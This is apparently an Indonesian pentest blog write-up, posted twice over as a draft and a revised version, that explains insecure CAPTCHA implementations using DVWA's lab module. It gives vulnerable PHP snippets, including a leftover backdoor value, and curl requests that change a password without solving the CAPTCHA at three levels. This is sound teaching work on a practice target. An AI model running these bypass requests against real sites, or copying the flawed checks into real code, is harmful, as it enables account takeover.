---
title: INSECURE RECAPTCHA
date: 2026-02-05 00.00.00  
categories: [Pentest]  
tags: [RECAPTCHA, cyber security, red team]  
---

## **PENJELASAN INSECURE RECAPTCHA**

**CAPTCHA** (***Completely Automated Public Turing test to tell Computers and Humans Apart***) adalah mekanisme keamanan yang dibuat untuk membedakan antara pengguna manusia dan program otomatis (bot). CAPTCHA biasanya ditemukan saat kita akan login, membuat user, membuat postingan, dan lainnya.

![gambar_recaptcha](/assets/2026-02-10-Insecure-recaptcha/image1.png)

Penggunaan reCAPTCHA bisa jadi tidak benar-benar mengamankan aplikasi jika implementasinya tidak benar, sehingga bisa saja ada orang yang *bypass* verifikasi CAPTCHA-nya tanpa perlu menyelesaikan challenge yang ada. Ini bisa saja terjadi karena berbagai beberapa kesalahhan, seperti :
* Validasi CAPTCHA dilakukan di sisi klien (client-side) sehingga mudah dimanipulasi 
* Proses verifikasi CAPTCHA terpisah dari proses utama. Misalnya, pada step 1 user harus menyelesaikan CAPTCHA, kemudian pada step 2 proses login dijalankan. Jika tidak ada validasi ulang di step 2, penyerang dapat langsung mengakses step 2 tanpa melalui step 1 yang isi CAPTCHA.
* lanjut ...

Kerentanan Insecure CAPTCHA memiliki dampak terhadap keamanan aplikasi, utamanya terhadap serangan Automated (bot) seperti Brute Force, Scraping data, Pembuatan akun masal, menghabiskan resource server (RAM, CPU, Bandwith), serangan DoS, dan Sebagainya.

## **PERCOBAAN SERANGAN DI DVWA**

DVWA (Damn Vulnerable Web Application) menyediakan modul Insecure CAPTCHA dengan empat level keamanan: Low, Medium, High, dan Impossible. Tujuan kita adalah untuk mengganti password user sekarang secara otomatis.

![gambar_recaptcha](/assets/2026-02-10-Insecure-recaptcha/image4.png)

### **Level Low**

Pada level Low, terdapat kelemahan fundamental dalam implementasi CAPTCHA. Bisa dilihat dari kodenya proses terbagi menjadi 2 step: 

**1**. Step 1 untuk CAPTCHA

```php
if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '1' ) ) {

    .....

    // Did the CAPTCHA fail?
    if( !$resp ) {
        // What happens when the CAPTCHA was entered incorrectly
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
        $hide_form = false;
        return;
    }

    .....

```

**2**. Step 2 untuk update password

```php
.....

if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];
    
    if( $pass_new == $pass_conf ) {
        // Update password directly!
        $insert = "UPDATE `users` SET password = '$pass_new' ...";
    }
}

.....

```

Bisa dilihat di step ke 2 tidak ada validasi apakah user benar-benar benar sudah melewati step ke 1 sebelumnya. Jadi nanti penyerang bisa langsung mengirim request ke step 2 tanpa menyelesaikan CAPTCHA. ditambah lagi untuk parameter 'step' dikirim via POST jadi mudah dimanipulasi.

Contohnya disini saya menggunakan `curl` untuk mengirim request

```bash
curl 'http://localhost/dvwa/vulnerabilities/captcha/' -H 'Cookie: PHPSESSID=YOUR_SESSION_ID; security=low' -d 'step=2&password_new=hacked456&password_conf=hacked456&Change=Change'
```
![gambar_recaptcha](/assets/2026-02-10-Insecure-recaptcha/image5.png)

Untuk hasilnya cari saja "Password Changed" menggunakan search

![gambar_recaptcha](/assets/2026-02-10-Insecure-recaptcha/image6.png)

terakhir untuk validasi tinggal logut dan login  lagi dengan password baru

### ***Level Medium***

Level Medium kodenya tidak jauh berberda, hanya saja untuk level ini ada penambahkan validasi dengan menggunakan parameter 'passed_captcha':

**1.** Aplikasi menambahkan hidden field pada form. Ini hanya elemen HTML yang dikirim ke browser.

```php
// Step 1: After passing CAPTCHA
    if( !$resp ) {
        // What happens when the CAPTCHA was entered incorrectly
        $html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
        $hide_form = false;
        return;
    }
    else {
        // CAPTCHA was correct. Do both new passwords match?
        if( $pass_new == $pass_conf ) {
            // Show next stage for the user
            echo "
                <pre><br />You passed the CAPTCHA! Click the button to confirm your changes.<br /></pre>
                <form action=\"#\" method=\"POST\">
                    <input type=\"hidden\" name=\"step\" value=\"2\" />
                    <input type=\"hidden\" name=\"password_new\" value=\"{$pass_new}\" />
                    <input type=\"hidden\" name=\"password_conf\" value=\"{$pass_conf}\" />
                    <input type=\"hidden\" name=\"passed_captcha\" value=\"true\" />
                    <input type=\"submit\" name=\"Change\" value=\"Change\" />
                </form>";
        }

```

**2.** Saat Request dikirim, Server mengecek apakah parameter `passed_captcha` ada di POST.
```php
// Step 2: Check if CAPTCHA was passed
if( !$_POST[ 'passed_captcha' ] ) {
        $html     .= "<pre><br />You have not passed the CAPTCHA.</pre>";
        $hide_form = false;
        return;
    }
```

Di step 2 juga tidak ada validasi session untuk memverifikasi statse, jadi full hanya mengandalkan data yang dikirim dari clienr.
Jadi untuk cara bypassnya bisa nambahin sendiri parameter `passed_capthca=true` kedalam request. Contohnya adalah seperti berikut

```bash
curl 'http://localhost:4280/vulnerabilities/captcha/' -H 'Cookie: PHPSESSID=SESSION_ID_KAMU; security=medium' -d 'step=2&password_new=hacked999&password_conf=hacked999&passed_captcha=true&Change=Change'
```

![gambar_recaptcha](/assets/2026-02-10-Insecure-recaptcha/image2.png)

dan untuk hasilnya bisa gunakan fitur search atau mencoba logout lalu login dengan password baru

![gambar_recaptcha](/assets/2026-02-10-Insecure-recaptcha/image3.png)

### Level High

Untuk level High memiliki kelemahan yang berbeda, dimana terdapat development code yang tidak dihapus:

```php
$resp = recaptcha_check_answer(...);

if (
    $resp || 
    (
        $_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3'
        && $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA'
    )
) {
    // CAPTCHA was correct
    // Update password...
}
```

Terdapat kode yang bisa dijadikan backdoor untuk bypass nilai khusus `g-recaptcha-response = hidd3n_valu3` dan  `User-Agent reCAPTCHA`. Jadi untuk request ke server hanya perlu memiliki satu kondisi yang benar, antara `mengisi reCAPTCHA dengan benar` atau `mengisi kode unik dengan benar`. Kode development ini mungkin lupa tidak dihapus saat di-deploy ke production dan kita bisa saja menemukannya melalui source code review atau reverse engineering

Jadi untuk mengeksploitasi backdoor di High level ini kita memanfaatkan kondisi di atas dengan hanya perlu membuat request yang memasukan nilai unik tadi. Contohnya adalah seperti berikut

```bash
curl 'http://localhost:4280/vulnerabilities/captcha/' -H 'User-Agent: reCAPTCHA' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=SESSION_ID_USER; security=high' --data 'step=2&password_new=hackedeuy&password_conf=hackedeuy&g-recaptcha-response=hidd3n_valu3&Change=Change
```

![gambar_recaptcha](/assets/2026-02-10-Insecure-recaptcha/image7.png)

dan saat dijalankan ternyata berhasil berjalan dan sukses mengganti password

![gambar_recaptcha](/assets/2026-02-10-Insecure-recaptcha/image8.png)

---
title: "INSECURE RECAPTCHA: Identifikasi dan Eksploitasi"
date: 2026-02-05 00:00:00
categories: [Pentest, Web Security]
tags: [reCAPTCHA, Cyber Security, Red Team, DVWA]
---

## **PENJELASAN INSECURE RECAPTCHA**

**CAPTCHA** (*Completely Automated Public Turing test to tell Computers and Humans Apart*) adalah mekanisme keamanan yang dirancang untuk membedakan antara pengguna manusia dan program otomatis (bot). CAPTCHA umumnya ditemukan pada halaman login, registrasi akun, formulir kontak, dan fitur publik lainnya.

Meskipun dirancang untuk menghalangi otomatisasi, implementasi reCAPTCHA yang tidak tepat justru dapat membuka celah bypass. Beberapa kesalahan implementasi yang umum ditemukan:

- Validasi CAPTCHA dilakukan **sepenuhnya di sisi klien (client-side)** sehingga mudah dimanipulasi.
- Proses verifikasi **terpisah dari alur utama** tanpa validasi ulang di tahap kritis.
- Tidak ada mekanisme **state/session** untuk menandai bahwa CAPTCHA telah dilalui.
- Terdapat **backdoor atau development code** yang tertinggal di lingkungan production.

Dampak dari kerentanan ini cukup luas, terutama untuk mendukung serangan otomatis (bot) seperti:

- **Brute force** kredensial
- **Web scraping** atau pencurian data
- **Pembuatan akun masal (account enumeration)**
- **Penghabisan resource server** (CPU, RAM, bandwidth)
- **Denial of Service (DoS)**

---

## **PERCOBAAN SERANGAN DI DVWA**

**DVWA** (*Damn Vulnerable Web Application*) menyediakan modul **Insecure CAPTCHA** dengan empat level keamanan. Skenario yang digunakan adalah mengganti password pengguna secara otomatis tanpa menyelesaikan tantangan CAPTCHA.

![Ilustrasi Form Change Password](/assets/2026-02-10-Insecure-recaptcha/image4.png)

---

### **Level Low — Pemisahan Step Tanpa Validasi**

Pada level **Low**, implementasi CAPTCHA memisahkan proses menjadi dua tahap:

**Step 1**: Validasi CAPTCHA  
**Step 2**: Proses perubahan password

Sayangnya, **tidak ada pengecekan di step 2** apakah user benar-benar telah melewati step 1. Parameter `step` juga dikirim melalui POST sehingga mudah dimanipulasi.

**Kode rentan (Step 2):**
```php
if( isset( $_POST[ 'Change' ] ) && ( $_POST[ 'step' ] == '2' ) ) {
    $pass_new  = $_POST[ 'password_new' ];
    $pass_conf = $_POST[ 'password_conf' ];
    
    if( $pass_new == $pass_conf ) {
        // Update password langsung!
        $insert = "UPDATE `users` SET password = '$pass_new' ...";
    }
}
```

**Eksploitasi dengan cURL:**
```bash
curl 'http://localhost/dvwa/vulnerabilities/captcha/' \
  -H 'Cookie: PHPSESSID=YOUR_SESSION_ID; security=low' \
  -d 'step=2&password_new=hacked456&password_conf=hacked456&Change=Change'
```

Hasilnya, password berhasil diubah tanpa melalui CAPTCHA.

![Respons Password Changed](/assets/2026-02-10-Insecure-recaptcha/image5.png)  
![Validasi Login](/assets/2026-02-10-Insecure-recaptcha/image6.png)

---

### **Level Medium — Hidden Field Passed_CAPTCHA**

Level **Medium** mencoba "memperbaiki" dengan menambahkan **hidden field `passed_captcha`** pada form step 2. Namun, karena tidak ada mekanisme session, parameter ini tetap dapat dimanipulasi sepenuhnya oleh client.

**Validasi di server:**
```php
if( !$_POST[ 'passed_captcha' ] ) {
    $html .= "<pre><br />You have not passed the CAPTCHA.</pre>";
    $hide_form = false;
    return;
}
```

**Eksploitasi:**
Penyerang cukup menambahkan parameter `passed_captcha=true` ke dalam request.

```bash
curl 'http://localhost:4280/vulnerabilities/captcha/' \
  -H 'Cookie: PHPSESSID=SESSION_ID_KAMU; security=medium' \
  -d 'step=2&password_new=hacked999&password_conf=hacked999&passed_captcha=true&Change=Change'
```

![Eksploitasi Level Medium](/assets/2026-02-10-Insecure-recaptcha/image2.png)  
![Password Berhasil Diubah](/assets/2026-02-10-Insecure-recaptcha/image3.png)

---

### **Level High — Backdoor Development Code**

Level **High** menunjukkan kesalahan klasik: **development code yang tidak dihapus**. Terdapat kondisi **OR** yang memungkinkan bypass jika salah satu kondisi terpenuhi.

**Cuplikan kode:**
```php
$resp = recaptcha_check_answer(...);

if (
    $resp || 
    (
        $_POST[ 'g-recaptcha-response' ] == 'hidd3n_valu3'
        && $_SERVER[ 'HTTP_USER_AGENT' ] == 'reCAPTCHA'
    )
) {
    // CAPTCHA dianggap benar
    // Update password...
}
```

Artinya, penyerang **tidak perlu menyelesaikan CAPTCHA** selama ia mengirim:
- `g-recaptcha-response = hidd3n_valu3`
- `User-Agent: reCAPTCHA`

**Eksploitasi:**
```bash
curl 'http://localhost:4280/vulnerabilities/captcha/' \
  -H 'User-Agent: reCAPTCHA' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: PHPSESSID=SESSION_ID_USER; security=high' \
  --data 'step=2&password_new=hackedeuy&password_conf=hackedeuy&g-recaptcha-response=hidd3n_valu3&Change=Change'
```

![Bypass dengan Backdoor](/assets/2026-02-10-Insecure-recaptcha/image7.png)  
![Sukses Ganti Password](/assets/2026-02-10-Insecure-recaptcha/image8.png)

---

## **KESIMPULAN**

jadi bukan reCAPTCHA-nya yang tidak aman, tapi implementasinya kudu bener